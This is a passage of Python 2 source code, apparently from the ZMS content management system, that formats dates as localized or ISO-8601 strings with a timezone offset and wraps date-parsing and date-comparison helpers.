        elif fmt_str == 'ISO-8601':
          # DST in t[8] ! -1 (unknown), 0 (off), 1 (on)
          if t[8] == 1:
            tz = time.altzone
          elif t[8] == 0:
            tz = time.timezone
          else:
            tz = 0
          tch = '+'
          if tz < 0:
            tch = '-'
          tz = abs(tz)
          tzh = tz/60/60
          tzm = (tz-tzh*60*60)/60
          return time.strftime('%Y-%m-%dT%H:%M:%S',t)+tch+('00%d'%tzh)[-2:]+':'+('00%d'%tzm)[-2:]
        fmt = self.getLangStr(fmt_str,lang)
        time_fmt = self.getLangStr('TIME_FMT',lang)
        date_fmt = self.getLangStr('DATE_FMT',lang)
        if fmt.find(time_fmt) >= 0:
          if t[3] == 0 and \
             t[4] == 0 and \
             t[5]== 0:
            fmt = fmt[:-len(time_fmt)]
        fmt = fmt.strip()
        t = time.localtime(time.mktime(t))
        return time.strftime(fmt,t)
      except:
        return str(t)

    # --------------------------------------------------------------------------
    #	ZMSGlobals.parseLangFmtDate:
    # --------------------------------------------------------------------------
    def parseLangFmtDate(self, s, lang=None, fmt_str=None, recflag=None):
      return _globals.parseLangFmtDate(s)

    # --------------------------------------------------------------------------
    #	ZMSGlobals.compareDate:
    # --------------------------------------------------------------------------
    def compareDate(self, t0, t1, accuracy_time=1):
      return _globals.compareDate(t0, t1, accuracy_time)

################################################################################
